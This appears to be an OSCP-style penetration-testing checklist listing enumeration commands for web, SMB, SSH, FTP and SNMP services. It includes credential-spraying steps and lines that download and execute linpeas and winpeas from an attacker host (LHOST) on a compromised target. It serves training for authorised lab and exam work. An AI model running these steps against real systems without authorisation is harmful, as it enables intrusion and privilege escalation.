# OSCP-Style Enumeration Checklist

Run this checklist on every machine. Never skip a port. Start the full nmap scan first, then work through services as they appear.

## Checklist

```
[ ] nmap -sV -sC -p- target -oA scans/nmap_full
[ ] nmap -sU --top-ports 100 target -oA scans/nmap_udp

[ ] HTTP/HTTPS (80, 443, 8080, 8443)?
    [ ] curl -I http://target && curl http://target/robots.txt
    [ ] gobuster dir -u http://target -w common.txt -x php,txt,html
    [ ] nikto -h http://target
    [ ] Review page source (Ctrl+U) for comments, hidden fields, paths

[ ] SMB (139, 445)?
    [ ] smbclient -L //target -N
    [ ] nxc smb target -u '' -p '' --shares
    [ ] nmap --script smb-vuln-ms17-010 -p 445 target

[ ] SSH (22)?
    [ ] Check version in nmap output
    [ ] searchsploit openssh <version>
    [ ] Default credentials if web app found first

[ ] FTP (21)?
    [ ] ftp target → user: anonymous, pass: (blank)
    [ ] nmap --script ftp-anon -p 21 target

[ ] SNMP (161/UDP)?
    [ ] nmap -sU -p 161 target
    [ ] snmpwalk -v2c -c public target
    [ ] snmpwalk -v2c -c private target

[ ] Found service version?
    [ ] searchsploit <service> <version>
    [ ] Google "<service> <version> exploit"

[ ] Found webapp?
    [ ] Manual test: auth, input fields, file uploads, directory traversal
    [ ] Burp Suite — enable proxy, browse all functionality

[ ] Have credentials?
    [ ] nxc smb target -u user -p pass
    [ ] nxc ssh target -u user -p pass
    [ ] Spray across all open services

[ ] Linux target with shell?
    [ ] wget http://LHOST:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh

[ ] Windows target with shell?
    [ ] certutil -urlcache -f http://LHOST:8080/winpeas.exe winpeas.exe && winpeas.exe
```

## Notes

- Document every open port even if no immediate exploit found
- Low-numbered ports and unusual ports (e.g. 3306, 5432, 6379, 27017) are often overlooked
- Re-enumerate after gaining access — internal services may now be reachable
